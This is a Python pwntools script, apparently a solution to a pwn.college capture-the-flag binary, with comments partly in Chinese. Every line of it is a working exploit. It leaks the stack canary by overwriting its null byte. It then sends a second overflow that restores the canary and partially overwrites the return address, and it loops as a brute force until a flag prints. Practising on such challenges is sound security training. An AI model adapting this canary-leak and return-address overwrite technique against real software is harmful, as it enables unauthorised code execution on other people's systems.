import sys
import itertools

from pwn import *

context.log_level = "error"

# recursive same canary
def exploit():
    p = process("/challenge/recursive-ruin-hard")

    try:
        # canary -> rbp - 8
        # buf -> rbp - 0x20

        # Phase 1: 触发后门并泄露 Canary
        p.sendlineafter(b"Payload size:", b"25") # buffer to canary

        # 构造 Payload 1: 'REPEAT' + padding + 1 byte 覆盖 Canary 的 \x00
        payload1 = b"REPEAT".ljust(24, b"A") + b"X"
        p.sendafter(b"bytes)!\n", payload1)

        # 接收泄露的数据
        p.recvuntil(b"You said: ")
        p.recv(25)  # 略过我们发送的 payload
        leaked_canary = p.recv(7)
        canary = b"\x00" + leaked_canary

        # Phase 2: 第二次 challenge() 进行栈溢出
        p.sendlineafter(b"Payload size:", b"42")

        # 构造 Payload 2: Padding + 真实的 Canary + Dummy RBP + 2 Bytes RIP 覆盖
        # target address -> 0x1c6b
        payload2 = b"A" * 24 + canary + b"B" * 8 + b"\x6b\x1c"
        p.sendafter(b"bytes)!\n", payload2)

        result = p.recvall(timeout=1)
        if b"flag{" in result or b"pwn.college{" in result:
            print("\n[+] Success!")
            print(result.decode())
            return True

    except Exception as e:
        pass
    finally:
        p.close()

    return False

if __name__ == "__main__":
    for attempts in itertools.count():
        sys.stdout.write(f"\rAttempt: {attempts}")
        sys.stdout.flush()
        if exploit():
            break
